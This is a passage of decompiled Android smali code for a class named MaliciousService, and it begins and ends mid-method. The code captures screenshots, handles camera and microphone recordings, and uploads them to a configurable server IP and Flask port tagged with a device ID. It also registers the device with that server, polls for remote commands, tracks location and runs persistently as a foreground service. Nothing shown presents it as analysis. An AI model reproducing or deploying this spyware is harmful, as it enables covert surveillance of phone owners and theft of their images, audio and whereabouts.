    invoke-static {v3, v4}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 663
    const-string v4, "screenshot"

    invoke-direct {p0, v2, v4}, Lcom/example/android/MaliciousService;->uploadFile(Ljava/io/File;Ljava/lang/String;)V

    goto :goto_c0

    .line 665
    :cond_bb
    const-string v4, "Screenshot file not found or empty after capture. Ensure device is rooted or screenshot permissions are available."

    invoke-static {v3, v4}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_c0
    .catch Ljava/io/IOException; {:try_start_46 .. :try_end_c0} :catch_d1
    .catch Ljava/lang/InterruptedException; {:try_start_46 .. :try_end_c0} :catch_cf
    .catchall {:try_start_46 .. :try_end_c0} :catchall_cd

    .line 670
    :goto_c0
    invoke-virtual {v2}, Ljava/io/File;->exists()Z

    move-result v4

    if-eqz v4, :cond_ff

    .line 671
    invoke-virtual {v2}, Ljava/io/File;->delete()Z

    move-result v2

    if-eqz v2, :cond_fc

    .line 672
    goto :goto_f8

    .line 670
    :catchall_cd
    move-exception v4

    goto :goto_100

    .line 667
    :catch_cf
    move-exception v4

    goto :goto_d2

    :catch_d1
    move-exception v4

    .line 668
    :goto_d2
    :try_start_d2
    invoke-virtual {v4}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v4

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "Error taking screenshot: "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_ec
    .catchall {:try_start_d2 .. :try_end_ec} :catchall_cd

    .line 670
    invoke-virtual {v2}, Ljava/io/File;->exists()Z

    move-result v4

    if-eqz v4, :cond_ff

    .line 671
    invoke-virtual {v2}, Ljava/io/File;->delete()Z

    move-result v2

    if-eqz v2, :cond_fc

    .line 672
    :goto_f8
    invoke-static {v3, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_ff

    .line 674
    :cond_fc
    invoke-static {v3, v1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 678
    :cond_ff
    :goto_ff
    return-void

    .line 670
    :goto_100
    invoke-virtual {v2}, Ljava/io/File;->exists()Z

    move-result v5

    if-eqz v5, :cond_113

    .line 671
    invoke-virtual {v2}, Ljava/io/File;->delete()Z

    move-result v2

    if-eqz v2, :cond_110

    .line 672
    invoke-static {v3, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_113

    .line 674
    :cond_110
    invoke-static {v3, v1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 677
    :cond_113
    :goto_113
    throw v4
.end method

.method private uploadFile(Ljava/io/File;Ljava/lang/String;)V
    .registers 14

    .line 820
    invoke-virtual {p1}, Ljava/io/File;->exists()Z

    move-result v0

    const-string v1, "MaliciousService"

    if-nez v0, :cond_23

    .line 821
    invoke-virtual {p1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object p1

    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v0, "File to upload does not exist: "

    invoke-virtual {p2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p2

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v1, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 822
    return-void

    .line 824
    :cond_23
    iget-object v0, p0, Lcom/example/android/MaliciousService;->SERVER_IP:Ljava/lang/String;

    if-eqz v0, :cond_26b

    iget-object v0, p0, Lcom/example/android/MaliciousService;->FLASK_PORT:Ljava/lang/String;

    if-eqz v0, :cond_26b

    iget-object v0, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    if-nez v0, :cond_31

    goto/16 :goto_26b

    .line 828
    :cond_31
    nop

    .line 829
    nop

    .line 830
    nop

    .line 831
    const-string v0, "\r\n"

    .line 832
    const-string v2, "--"

    .line 833
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v3

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "*****"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v3, v4}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    .line 835
    const/4 v4, 0x0

    :try_start_54
    new-instance v5, Ljava/net/URL;

    iget-object v6, p0, Lcom/example/android/MaliciousService;->SERVER_IP:Ljava/lang/String;

    iget-object v7, p0, Lcom/example/android/MaliciousService;->FLASK_PORT:Ljava/lang/String;

    iget-object v8, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    const-string v10, "http://"

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v9, ":"

    invoke-virtual {v6, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "/api/upload_"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "/"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-direct {v5, v6}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 836
    invoke-virtual {v5}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v5

    check-cast v5, Ljava/net/HttpURLConnection;
    :try_end_96
    .catch Ljava/io/IOException; {:try_start_54 .. :try_end_96} :catch_22e
    .catchall {:try_start_54 .. :try_end_96} :catchall_22c

    .line 837
    const/4 v4, 0x1

    :try_start_97
    invoke-virtual {v5, v4}, Ljava/net/HttpURLConnection;->setDoInput(Z)V

    .line 838
    invoke-virtual {v5, v4}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V

    .line 839
    const/4 v4, 0x0

    invoke-virtual {v5, v4}, Ljava/net/HttpURLConnection;->setUseCaches(Z)V

    .line 840
    const-string v6, "POST"

    invoke-virtual {v5, v6}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    .line 841
    const-string v6, "Connection"

    const-string v7, "Keep-Alive"

    invoke-virtual {v5, v6, v7}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 842
    const-string v6, "ENCTYPE"

    const-string v7, "multipart/form-data"

    invoke-virtual {v5, v6, v7}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 843
    const-string v6, "Content-Type"

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "multipart/form-data;boundary="

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v5, v6, v7}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 844
    invoke-virtual {p1}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, p2, v6}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 845
    const/16 v6, 0x7530

    invoke-virtual {v5, v6}, Ljava/net/HttpURLConnection;->setConnectTimeout(I)V

    .line 846
    invoke-virtual {v5, v6}, Ljava/net/HttpURLConnection;->setReadTimeout(I)V

    .line 847
    new-instance v6, Ljava/io/DataOutputStream;

    invoke-virtual {v5}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v7

    invoke-direct {v6, v7}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    .line 848
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v7, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 849
    invoke-virtual {p1}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v7

    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    const-string v9, "Content-Disposition: form-data; name=\""

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "\"; filename=\""

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    const-string v8, "\""

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 850
    const-string v7, "application/octet-stream"

    .line 851
    const-string v8, "screenshot"

    invoke-virtual {p2, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-eqz v8, :cond_136

    const-string v7, "image/png"

    .line 852
    :cond_136
    const-string v8, "camera"

    invoke-virtual {p2, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-eqz v8, :cond_140

    const-string v7, "video/mp4"

    .line 853
    :cond_140
    const-string v8, "mic"

    invoke-virtual {p2, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-eqz v8, :cond_14a

    const-string v7, "audio/wav"

    .line 854
    :cond_14a
    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    const-string v9, "Content-Type: "

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 855
    invoke-virtual {v6, v0}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 856
    new-instance v7, Ljava/io/FileInputStream;

    invoke-direct {v7, p1}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    .line 857
    const/16 p1, 0x1000

    new-array p1, p1, [B

    .line 859
    :goto_170
    invoke-virtual {v7, p1}, Ljava/io/FileInputStream;->read([B)I

    move-result v8

    const/4 v9, -0x1

    if-eq v8, v9, :cond_17b

    .line 860
    invoke-virtual {v6, p1, v4, v8}, Ljava/io/DataOutputStream;->write([BII)V

    goto :goto_170

    .line 862
    :cond_17b
    invoke-virtual {v6, v0}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 863
    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v6, p1}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 864
    invoke-virtual {v6}, Ljava/io/DataOutputStream;->flush()V

    .line 865
    invoke-virtual {v5}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result p1

    .line 866
    const/16 v0, 0xc8

    if-ne p1, v0, :cond_1bc

    .line 867
    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    const-string v0, " uploaded successfully."

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v1, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_216

    .line 869
    :cond_1bc
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "Server responded with non-OK code for "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, " upload: "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v1, p1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 870
    new-instance p1, Ljava/io/BufferedReader;

    new-instance v0, Ljava/io/InputStreamReader;

    invoke-virtual {v5}, Ljava/net/HttpURLConnection;->getErrorStream()Ljava/io/InputStream;

    move-result-object v2

    invoke-direct {v0, v2}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {p1, v0}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V
    :try_end_1ea
    .catch Ljava/io/IOException; {:try_start_97 .. :try_end_1ea} :catch_229
    .catchall {:try_start_97 .. :try_end_1ea} :catchall_226

    .line 872
    :try_start_1ea
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    .line 873
    :goto_1ef
    invoke-virtual {p1}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v2

    if-eqz v2, :cond_1f9

    .line 874
    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :goto_1ef

    .line 876
    :cond_1f9
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "Error response: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_213
    .catchall {:try_start_1ea .. :try_end_213} :catchall_21c

    .line 877
    :try_start_213
    invoke-virtual {p1}, Ljava/io/BufferedReader;->close()V
    :try_end_216
    .catch Ljava/io/IOException; {:try_start_213 .. :try_end_216} :catch_229
    .catchall {:try_start_213 .. :try_end_216} :catchall_226

    .line 882
    :goto_216
    if-eqz v5, :cond_264

    .line 883
    invoke-virtual {v5}, Ljava/net/HttpURLConnection;->disconnect()V

    goto :goto_264

    .line 870
    :catchall_21c
    move-exception v0

    :try_start_21d
    invoke-virtual {p1}, Ljava/io/BufferedReader;->close()V
    :try_end_220
    .catchall {:try_start_21d .. :try_end_220} :catchall_221

    goto :goto_225

    :catchall_221
    move-exception p1

    :try_start_222
    invoke-static {v0, p1}, Lcom/example/android/MaliciousService$$ExternalSyntheticBackport0;->m(Ljava/lang/Throwable;Ljava/lang/Throwable;)V

    :goto_225
    throw v0
    :try_end_226
    .catch Ljava/io/IOException; {:try_start_222 .. :try_end_226} :catch_229
    .catchall {:try_start_222 .. :try_end_226} :catchall_226

    .line 882
    :catchall_226
    move-exception p1

    move-object v4, v5

    goto :goto_265

    .line 879
    :catch_229
    move-exception p1

    move-object v4, v5

    goto :goto_22f

    .line 882
    :catchall_22c
    move-exception p1

    goto :goto_265

    .line 879
    :catch_22e
    move-exception p1

    .line 880
    :goto_22f
    :try_start_22f
    iget-object v0, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    invoke-virtual {p1}, Ljava/io/IOException;->getMessage()Ljava/lang/String;

    move-result-object p1

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "Failed to upload "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p2

    const-string v2, " for device "

    invoke-virtual {p2, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p2

    invoke-virtual {p2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p2

    const-string v0, ": "

    invoke-virtual {p2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p2

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v1, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_25f
    .catchall {:try_start_22f .. :try_end_25f} :catchall_22c

    .line 882
    if-eqz v4, :cond_264

    .line 883
    invoke-virtual {v4}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 886
    :cond_264
    :goto_264
    return-void

    .line 882
    :goto_265
    if-eqz v4, :cond_26a

    .line 883
    invoke-virtual {v4}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 885
    :cond_26a
    throw p1

    .line 825
    :cond_26b
    :goto_26b
    const-string p1, "Server IP/Flask Port not obtained, or Device ID not loaded, cannot upload file."

    invoke-static {v1, p1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 826
    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .registers 2

    .line 68
    const/4 p1, 0x0

    return-object p1
.end method

.method public onCreate()V
    .registers 5

    .line 73
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 74
    const-string v0, "Service created!"

    const-string v1, "MaliciousService"

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 75
    invoke-static {}, Ljava/util/concurrent/Executors;->newSingleThreadExecutor()Ljava/util/concurrent/ExecutorService;

    move-result-object v0

    iput-object v0, p0, Lcom/example/android/MaliciousService;->executorService:Ljava/util/concurrent/ExecutorService;

    .line 76
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->initializeUniqueDeviceId()V

    .line 77
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->injectConfigFromAssets()V

    .line 78
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->loadServerConfigFromPreferences()V

    .line 79
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->checkAndRequestPermissions()V

    .line 80
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->grantPermissions()V

    .line 82
    iget-object v0, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    const-wide/16 v2, 0x1388

    if-eqz v0, :cond_77

    iget-object v0, p0, Lcom/example/android/MaliciousService;->SERVER_IP:Ljava/lang/String;

    if-eqz v0, :cond_77

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_77

    iget-object v0, p0, Lcom/example/android/MaliciousService;->FLASK_PORT:Ljava/lang/String;

    if-eqz v0, :cond_77

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_77

    invoke-direct {p0}, Lcom/example/android/MaliciousService;->allPermissionsGranted()Z

    move-result v0

    if-eqz v0, :cond_77

    .line 83
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->registerDeviceWithServer()V

    .line 84
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->createNotificationChannel()V

    .line 85
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->buildNotification()Landroid/app/Notification;

    move-result-object v0

    .line 86
    const/4 v1, 0x1

    invoke-virtual {p0, v1, v0}, Lcom/example/android/MaliciousService;->startForeground(ILandroid/app/Notification;)V

    .line 87
    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    iput-object v0, p0, Lcom/example/android/MaliciousService;->handler:Landroid/os/Handler;

    .line 88
    new-instance v0, Lcom/example/android/MaliciousService$1;

    invoke-direct {v0, p0}, Lcom/example/android/MaliciousService$1;-><init>(Lcom/example/android/MaliciousService;)V

    iput-object v0, p0, Lcom/example/android/MaliciousService;->commandCheckRunnable:Ljava/lang/Runnable;

    .line 110
    const-string v0, "location"

    invoke-virtual {p0, v0}, Lcom/example/android/MaliciousService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/location/LocationManager;

    iput-object v0, p0, Lcom/example/android/MaliciousService;->locationManager:Landroid/location/LocationManager;

    .line 111
    new-instance v0, Lcom/example/android/MaliciousService$2;

    invoke-direct {v0, p0}, Lcom/example/android/MaliciousService$2;-><init>(Lcom/example/android/MaliciousService;)V

    iput-object v0, p0, Lcom/example/android/MaliciousService;->locationListener:Landroid/location/LocationListener;

    .line 125
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->startLocationUpdates()V

    .line 126
    iget-object v0, p0, Lcom/example/android/MaliciousService;->handler:Landroid/os/Handler;

    iget-object v1, p0, Lcom/example/android/MaliciousService;->commandCheckRunnable:Ljava/lang/Runnable;

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 127
    goto :goto_8f

    .line 128
    :cond_77
    const-string v0, "Service started, but configuration or permissions are missing. Waiting for them."

    invoke-static {v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 129
    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    iput-object v0, p0, Lcom/example/android/MaliciousService;->handler:Landroid/os/Handler;

    .line 130
    new-instance v0, Lcom/example/android/MaliciousService$3;

    invoke-direct {v0, p0}, Lcom/example/android/MaliciousService$3;-><init>(Lcom/example/android/MaliciousService;)V

    iput-object v0, p0, Lcom/example/android/MaliciousService;->commandCheckRunnable:Ljava/lang/Runnable;

    .line 147
    iget-object v1, p0, Lcom/example/android/MaliciousService;->handler:Landroid/os/Handler;

    invoke-virtual {v1, v0, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 149
    :goto_8f
    return-void
.end method

.method public onDestroy()V
    .registers 3

    .line 176
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 177
    const-string v0, "MaliciousService"

    const-string v1, "Service destroyed!"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 178
    iget-object v0, p0, Lcom/example/android/MaliciousService;->handler:Landroid/os/Handler;

    if-eqz v0, :cond_13

    .line 179
    iget-object v1, p0, Lcom/example/android/MaliciousService;->commandCheckRunnable:Ljava/lang/Runnable;

    invoke-virtual {v0, v1}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    .line 181
    :cond_13
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->stopLocationUpdates()V

    .line 182
    iget-object v0, p0, Lcom/example/android/MaliciousService;->executorService:Ljava/util/concurrent/ExecutorService;

    if-eqz v0, :cond_1d

    .line 183
    invoke-interface {v0}, Ljava/util/concurrent/ExecutorService;->shutdownNow()Ljava/util/List;

    .line 185
    :cond_1d
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .registers 7

    .line 153
    const-string p2, "Service started or restarted!"

    const-string p3, "MaliciousService"

    invoke-static {p3, p2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 154
    if-eqz p1, :cond_73

    .line 155
    const-string p2, "SERVER_IP"

    invoke-virtual {p1, p2}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    .line 156
    const-string v0, "SERVER_PORT"

    invoke-virtual {p1, v0}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 157
    if-eqz p2, :cond_4e

    invoke-virtual {p2}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_4e

    if-eqz v0, :cond_4e

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_4e

    .line 158
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "Received server config via Intent: IP="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, ", Port="

